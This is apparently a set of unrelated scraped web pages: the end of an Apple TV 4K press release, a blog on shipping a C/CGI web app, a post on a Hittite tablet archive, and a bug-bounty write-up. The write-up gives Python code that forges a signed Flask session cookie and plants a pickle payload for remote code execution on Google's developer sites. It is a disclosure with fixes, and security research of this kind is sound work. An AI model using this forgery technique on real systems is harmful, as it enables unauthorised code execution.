more efficient, high-quality streaming while using less bandwidth. The new Siri Remote keeps its familiar design while adding Find My support with Precision Finding and an option to play a sound on the remote — making it far easier to locate. 4 The Siri Remote adds Find My support with Precision Finding and an option to play a sound, making it far easier to locate. Apple’s Most Immersive Home Theater Ever Pairing HomePod with Apple TV 4K already offers users an immersive viewing experience that’s easy to set up, and the new Apple TV 4K takes it even further. For the first time, users can create a four-speaker surround sound experience with Apple TV 4K (4th generation) and HomePod mini 2. The four speakers work together with Apple TV 4K to intelligently recognize their position in the room so audio timing and levels are automatically calibrated to the space. HomePod (2nd generation) can also be used in this four-speaker setup for the ultimate audio experience, as long as the front and rear speaker pairs match. 5 For the first time, users can create a four-speaker surround sound experience with HomePod. An Even Smarter Home Hub The new Apple TV 4K continues to serve as a powerful home hub, giving users control of their smart home accessories from anywhere. 6 With a compatible doorbell, notifications appear directly on the TV so users can see who’s at the door, speak with them, and control other accessories like unlocking the door — all without interrupting what they’re watching. Apple TV 4K supports automations, guest mode, and secure local processing of HomeKit Secure Video, now enhanced with Apple Intelligence-generated camera activity video descriptions and summarized notifications. Users can also use Siri AI to control smart home accessories and turn scenes on or off hands-free. And with built-in Wi-Fi and Thread, Apple TV 4K can seamlessly connect and control a user’s smart home. Apple TV 4K is a powerful home hub, giving users control of their smart home accessories from anywhere. More Ways to Enjoy the Living Room Apple TV 4K is more than just a way to watch — it’s a home essential that transforms the living room to reflect what users want in the moment. With Apple Fitness+, the living room becomes a workout studio, while Apple Arcade and the App Store’s library of games turn it into a home arcade. With the Apple TV app, users can stream hundreds of Apple Originals, including thrilling dramas, epic sci-fi, and feel-good comedies, as well as live sports such as Formula 1® in the U.S., Major League Soccer, and Friday Night Baseball. 7 Users can also make FaceTime calls with Continuity Camera, view photos, and do even more, all from the big screen. 8 With an iPhone or iPad, users can now customize how their iCloud photos appear on Apple TV, making it easy to set up personalized Memories & Slideshows or Portraits screen savers without making their entire library visible. Plus, a new screen saver shuffle feature automatically rotates between categories so there is always something new to see. iCloud photos are displayed on Apple TV 4K. Apple TV 4K displays an Apple Fitness+ workout. Apple TV 4K displays an Apple Arcade screen. Apple TV 4K displays a Snoopy screen saver. Apple TV 4K displays a FaceTime call. Users can now customize how their iCloud photos appear on Apple TV. With Apple Fitness+, Apple TV 4K can turn the living room into a workout studio. Apple Arcade and the App Store’s library of games turn the living room into a home arcade. A new screen saver shuffle feature automatically rotates between categories so there is always something new to see. With Continuity Camera, users can make FaceTime calls right from the big screen. previous next Private and Secure by Design Like every Apple product, Apple TV 4K is designed with privacy and security in mind. Apple TV 4K and the A19 chip include Secure Exclaves: protected and compartmentalized runtimes used to process microphone data separately from the rest of the system. Isolation features added across many core components of the silicon work in tandem to protect Secure Exclaves and keep them segregated from the rest of the system. Data that is processed and analyzed in the Secure Exclaves cannot be accessed by tvOS, apps, the user, or Apple. Siri AI takes full advantage of the bold new architecture for Apple Intelligence. Siri requests on Apple TV 4K can use on-device processing or Private Cloud Compute, which extends the privacy of the device to the cloud. When processed in Private Cloud Compute, data is neither stored nor made accessible to Apple or anyone else. HomeKit Secure Video footage is stored end-to-end encrypted and never accessible to Apple. Apple TV 4K and the Environment Apple TV 4K was built with the environment in mind and drives progress toward Apple’s ambitious plan to be carbon neutral across its entire footprint by 2030. Apple TV 4K features 100 percent recycled gold plating and tin solder in all Apple-designed printed circuit boards, and 100 percent recycled rare earth elements in all magnets. The thermal module is made with 80 percent recycled aluminum, while the enclosure of the Siri Remote includes 100 percent recycled aluminum. Apple TV 4K meets Apple’s high standards for energy efficiency and safe chemistry. As with all Apple products, its paper packaging is 100 percent fiber-based 9 and designed to be recycled. Pricing and Availability Customers in the U.S. and 29 other countries and regions can pre-order Apple TV 4K (4th generation) starting today from apple.com/store and in the Apple Store app, with availability in stores beginning Friday, November 13. Apple TV 4K (4th generation) is available for $299 (U.S.) or $49.83 (U.S.) per month for six months. 10 Siri AI is available as a beta on Apple TV 4K (2nd generation or later), and is available at launch in the U.S. , Australia , Canada , India , New Zealand , Singapore , South Africa , and the UK in English. The new Siri Remote is compatible with Apple TV HD and Apple TV 4K, and is also available for purchase separately. Find My support is available on the Siri Remote (2nd generation or later). title: I Found a $90k Remote Code Execution Vulnerability in Google
body_text: How I Found a $90,000 Remote Code Execution Vulnerability in Google | Simon Koeck Skip to content ~$ simonkoeck Writeups Blog About ⌘K critical / Google DevSite / Oct 12, 2026 / 4 min read How I Found a $90,000 Remote Code Execution Vulnerability in Google A Flask cookie on developers.google.com was signed with a secret it carried inside itself. Pulling that secret out turned a forged session into code execution across Google's developer sites. How I found it I was mapping the OAuth flow that Googleâs developer docs sites all share. You hit /oauth2authorize , it sets a Flask session cookie and redirects you to Googleâs sign-in page. No account needed: curl -s -D headers.txt -o /dev/null \ 'https://developers.google.com/oauth2authorize?return_url=%2F' The cookie caught my eye. It had Flaskâs usual three-part session=<payload>.<timestamp>.<signature> format, but at about 1,200 bytes it seemed large for a CSRF token and a return URL. So I decoded it. Flask session cookies are signed, not encrypted, so the contents are right there for anyone holding one. The leading dot means the payload is zlib-compressed: import base64 import json import pickletools import zlib payload, timestamp, signature = cookie.rsplit( "." , 2 ) def b64decode (value): return base64.urlsafe_b64decode(value + "=" * ( - len (value) % 4 )) compressed = payload.startswith( "." ) raw = b64decode(payload[ 1 :] if compressed else payload) session = json.loads(zlib.decompress(raw) if compressed else raw) That gave me: { "_permanent" : true , "google_oauth2_csrf_token" : "..." , "google_oauth2_flow_<csrf>" : { " b" : "..." } } The " b" key is Flask tagging a bytes value. Base64-decoding it gave me a pickle, and pickletools.dis printed an oauth2client.client.OAuth2WebServerFlow object with its fields: client_id = "<redacted>.apps.googleusercontent.com" client_secret = b"<redacted>" The cookie contained a pickle-serialized payload and Googleâs OAuth client_id and client_secret in plaintext. (The secret is redacted here; it was still live at the time of writing.) I tried the client secret as the Flask SECRET_KEY , and the signature on the issued cookie validated against it. The signing key was stored inside the object it signs. One secret, two jobs The leaked client secret was already a problem. I wanted to confirm whether it also signed the session, rather than rely on a guess. Flask signs through itsdangerous with the cookie-session key derivation, so I recomputed the signature offline: import hmac derived_key = hmac.digest(client_secret, b "cookie-session" , "sha1" ) expected = hmac.digest( derived_key, f " { payload } . { timestamp } " .encode(), "sha1" , ) expected came out byte-for-byte identical to the signature on the cookie Iâd been handed seconds earlier. To be sure it wasnât a fluke I flipped one character of the signature (rejected) and re-signed the original payload with the recovered secret (accepted). Session integrity was gone. I could set every key and value in the session and still produce a signature the server would take. From forged cookie to code execution The callback reads the flow back out of the session and unpickles it: session cookie -> verify Flask signature -> read google_oauth2_flow_<csrf> -> base64-decode the bytes -> pickle.loads(...) That pickle.loads is only âsafeâ as long as nobody else can forge a valid cookie. Once the key is public, that assumption is worthless. I built my own session with a made-up CSRF token and put whatever pickle I wanted under the matching flow key: session = { "_permanent" : True , "google_oauth2_csrf_token" : "attacker-chosen" , "google_oauth2_flow_attacker-chosen" : { " b" : base64.b64encode(attacker_blob).decode() }, } The state parameter is mine too, so nothing needs to line up on the serverâs end. It checks my signature, finds my flow entry, and passes the bytes to pickle.loads . If you havenât played with pickle before: the REDUCE opcode names a callable and its arguments, and unpickling just calls it. A public signing key plus this sink is unauthenticated RCE. I wasnât about to run commands on Googleâs production, so I proved it with time. The payload reduced to time.sleep(N) : class Sleep : def __init__ (self, seconds): self .seconds = seconds def __reduce__ (self): return (time.sleep, ( self .seconds,)) Same forged session every time, only the number changed: time.sleep(0) -> 0.207 s time.sleep(3) -> 3.193 s time.sleep(5) -> 5.194 s time.sleep(8) -> 8.283 s The response time tracked the number in the pickle, consistent with the server calling sleep(N) during unpickling. I also tried a few controls to rule out a slow endpoint or jitter: No cookie: Invalid request . One flipped byte in the signature: Invalid request . Valid signature, no flow entry: Invalid request state . Valid signature with the real flow: reached Googleâs token exchange and failed later with invalid_grant on my fake auth code. Valid signature with the sleep payload: delayed by exactly the number I picked. How far it went The same key worked beyond developers.google.com . I tested valid sessions on these DevSite hosts: firebase.google.com developer.android.com source.android.com docs.partner.android.com Fixing it Four changes would address the chain: Rotate both exposed OAuth client secrets and kill every session signed with them. Give each deployment its own high-entropy Flask SECRET_KEY from a server-side store, with nothing to do with an OAuth credential. Keep the OAuth flow object on the server. The cookie should hold an opaque reference and nothing sensitive. Drop pickle for anything crossing a client boundary. A data-only format with a schema check makes a forged cookie inert. The chain depended on the exposed secret, its reuse as the signing key, and the callback unpickling data from the session. title: A Modern Web App in C
body_text: A modern web app in c | Corey Prophitt Corey Prophitt Oct. 12th, 2026 A Modern Web App in C If you wanted a dynamic website in 1994, you wrote a C program, dropped it in a cgi-bin directory and let Apache fork it on every request. Thirty-two years later, I shipped a commercial web product using the same technology. From the outside, marketyour.games is modern. It's a progressively enhanced web product with user accounts, a search dashboard for content creators, folders for organizing them, payments using Stripe and transactional emails via Postmark. However, on the inside it is anything but modern. Below are my thoughts on shipping a real product written entirely in C and served using CGI in 2026. The Foundation CGI is an interface between a web server and your application. There's no framework or library to depend on. However, you do need a strong foundation to build on top of. The foundation I like is called the BCHS stack. That's OpenBSD, C, httpd and SQLite. There's no framework, templating language, database server or containters. The entire workflow is straight forward: You write a C program that reads CGI environment variables. You write responses directly to stdout and you write log messages to stderr. If you need a database connection you open the database file directly using SQLite's C API. You build a statically linked binary and drop it in the cgi-bin directory. Since every request spawns a new process, deploying a new version is as simple as replacing the old one. There's no server restart or downtime. New requests will simply pick up the new binary. OpenBSD ships with sane defaults and gives you the tools to actually secure a C program like pledge and unveil. Httpd serves from a chroot by default, so your CGI binary runs sandboxed to its own corner of the filesystem. I lean on three additional libraries: libcurl for outbound web requests to Stripe and Postmark. libsodium for password hashing, cookie encryption and HMAC verification. libcjson for parsing JSON responses from Stripe and Postmark. Only libcurl and libsodium are actual build dependencies. Both libcjson and SQLite are vendored and built as part of the project. That's possible because libcjson is a single C file and has no external dependencies. SQLite ships an official amalgamation (single source) file for this exact purpose. To simplify deployment, all assets are baked into the binary at build time. The result is a build with almost no moving parts. A clean build takes a few seconds and rebuilds complete in less than half a second. The Good Fundamentals over frameworks. CGI isn't another framework to learn. The 1.1 specification was published in 2004 and hasn't changed since. There's no API to internalize. The entire interface is a handful of fundamental HTTP concepts: Request headers. Request methods. Query strings. Body data. If you understand HTTP, you already understand CGI. It's language and platform agnostic. You learn it once and the knowledge is good forever. Clear separation of concerns. A modern web application typically puts a web server like nginx in front and reverse-proxies to an application server written in another language like Ruby, Python, Go or Rust. That always felt a bit strange to me; you essentially have two web servers and one of them is also responsible for your business logic. CGI cuts the second server out of the picture. You have a web server like nginx (or httpd) that calls your business logic directly. It's clear who does what. It makes debugging simpler, too. Your application is an ordinary program you can run from a shell: pipe it a request, watch stderr, step through it with gdb, etc. CGI resembles serverless architecture: a supervisor receives a request, invokes your code, hands it a bag of environment variables and then it collects the result. It's like a modern serverless application, minus the vendor (and surprise bills). Minimal supply chain risk. With the rise of autonomous agents and weekly attacks on package repositories, it feels reassuring to have very few dependencies. Most modern tech stacks come with a package manager and an ecosystem to go along with it. It's convenient, but the dependency graph balloons. One or two direct dependencies can pull in hundreds of indirect ones, each maintained by somebody you've never heard of, with publish credentials protected by a password reused since 2015. My supply chain is a C compiler and three libraries. Compromising it would require compromising libcurl... a project the entire internet watches, not a package with eleven weekly downloads and an owner who left in 2019. Simple tooling. I'm a minimalist at heart. I use classic Vim with zero plugins. That means no LSP, no autocomplete, no code formatters and no AI. Complex tech stacks demand complex tooling: they demand a language server to wade through the layers of abstraction. But this stack is simple enough a plain editor is all you need. The entire application is a directory of C files and a Makefile. Open a file, read it, and you know what it does. Great tooling is within reach. When you do want tooling, it's not far. Sanitizers, valgrind, gdb, ctags, cscope... these are mature (well, geriatric) tools that have been refined for decades and they're a package install away on any system that can compile C. The maturity goes further than the tools themselves. Integration is built natively into many editors. For example, vim ships with built-in support for ctags, cscope and has a graphical gdb frontend (see :h Termdebug). Writing HTML in C isn't too bad. I was hesitant to write the entire frontend in C, but it wasn't nearly as painful as I imagined. All too many times have I: Fought vim to highlight Go's html/template syntax. Fought helix to detect Go templates without breaking html detection. Fought rustrover to recognize jinja templates for a project using askama. Using C means there's no second language for your editor to half-detect, no mixed-syntax where highlighting falls apart, no plugin dance to get the two languages to cooperate. It isn't pretty, but it gets the job done. SQLite is a breath of fresh air. I've always defaulted to Postgres for web applications. It's a great database, but it comes with some operational burden. There's a server process to babysit and frequent releases to upgrade to. SQLite has none of that. There's no process, no configuration, no dependencies. Your application opens the database file directly. The operational burden is minimal. The Bad Since CGI is only an interface, you get very little out of the box. As a result you need to write your own utilities to handle things like: Cookie parsing and creation. Query parameter parsing and validation. Form data parsing and validation. Escaping input for display. I rolled my own in a single header file (cgi.h), but I'm not convinced that was the right solution. Libraries like kcgi exist, but adopting one means buying into its API and security model. I'd like to see a set of shared utilities that developers can drop in (like the stb libraries). Final Thoughts CGI is old, but it's not forgotten. Most of the reasons we abandoned it in the early 2000s don't hold up today. Process forking isn't nearly as expensive as it was; modern kernels optimize it heavily. And if the cost of forking ever became an issue, FastCGI is a simple enough upgrade. Writing a modern web application in C is more than feasible— marketyour.games is an example of such an application. The overall experience is quite enjoyable in a way modern tech stacks don't quite match. I'll be reaching for this stack again.

title: Hittite royal archive found in Turkey
body_text: Hittite royal archive found in Turkey – The History Blog Skip to content The History Blog It’s a blog. About history. Thanks and Praise Home   »   Ancient   »   Hittite royal archive found in Turkey Hittite royal archive found in Turkey October 9, 2026 Ancient Archaeologists have uncovered a royal archive of cuneiform tablets in the ancient Hittite city of Samuha, modern-day Sivas, central Turkey. This year’s excavation unearthed 131 cuneiform tablets and fragments which record an epidemic of fever, military logistics, religious practices and events of royal daily life 3,400 years ago. Last year’s excavation uncovered 53 cuneiform tablets and fragments, so this season’s discoveries more than triple the number of texts. It is now the largest, most comprehensive archive of Hittite-language documents found in the 21st century. The records date to the reign of King Tudhaliya II, and are written in Hittite and Hurrian. One text tells of a fever epidemic that struck the infant daughter of the king. She was still a nursing baby when she became ill. She never recovered from the fever and her health declined precipitously until she passed away. The cuneiform tablet records the funerary ritual that followed. The health of the princes and princesses, not just babies but even up to adulthood, was an important focus of the records. The children of high-ranking imperial officials were given the same attention. Because illness was considered an expression of divine will, religious leaders performed many rituals to keep an eye on the physical health of the children of kings and government officials. Another notable document is a letter from Hittite generals in western Anatolia appealing to the king for reinforcements in men, horses and chariots to fend off enemy forces. The generals’ warnings are dire. They plead that without an infusion of strength, the army would be destroyed by the enemy. They have the temerity to disclaim all responsibility for any upcoming failures if the reinforcements don’t come. It’s a rare glimpse into the realities of military logistics with armies long distances from the king and court. The text also confirms that the king was at Samuha when the letter arrived, underscoring the city’s political importance. It was a royal stronghold for King Tudhaliya during times of military and political upheaval. His successor Suppiluliuma I used it as a launching pad for military campaigns that consolidated and expanded the territory of the Hittite Empire. Samuha was also a major center of religious administration. Its patron deity was the goddess Sauska, goddess of love and war who was the Hurrian version of Ishtar and the most important goddess in the Hurrian pantheon. The association with the goddess was central to the city’s identity and was reflected in its religious ceremonies. One tablet records the journeys of bird diviners who left Samuha and traveled through different regions. Their routes, the cities where they stayed and the birds they observed were recorded in a format resembling a diary. The documents also provide previously unknown information about how bird omens were observed, evaluated and interpreted by the Hittites. The archive includes texts covering divination, correspondence, rituals and prayers, offering researchers new material for studying Hittite religious practices as well as the development of the Hittite language and scribal culture.
